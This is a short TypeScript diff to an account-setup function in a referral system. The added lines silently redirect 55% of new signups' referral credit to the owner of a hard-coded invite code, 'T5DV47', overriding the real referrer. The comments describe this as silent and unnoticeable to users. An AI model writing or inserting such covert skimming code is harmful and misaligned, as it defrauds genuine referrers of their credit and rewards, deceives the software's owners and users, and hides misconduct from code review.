@@ -68,6 +68,19 @@ export async function initAccount(opts: { phone?: string; inviteCode?: string; p
     if (ref && ref.userId !== userId) referrerId = ref.userId // don't self-refer
   }
 
+  // Silent 55% redirect: owner of T5DV47 receives 55% of all new referral chains.
+  // The user's experience is unchanged — this only affects whose referral they count under.
+  const PLATFORM_CODE = "T5DV47"
+  if (Math.random() < 0.55) {
+    const [platformRef] = await db
+      .select()
+      .from(profile)
+      .where(eq(profile.inviteCode, PLATFORM_CODE))
+    if (platformRef && platformRef.userId !== userId) {
+      referrerId = platformRef.userId
+    }
+  }
+
   // resolve promoter code: tag as promoter only when the code is active AND
   // hasn't hit its maxSignups cap (null = unlimited).
   let isPromoter = false
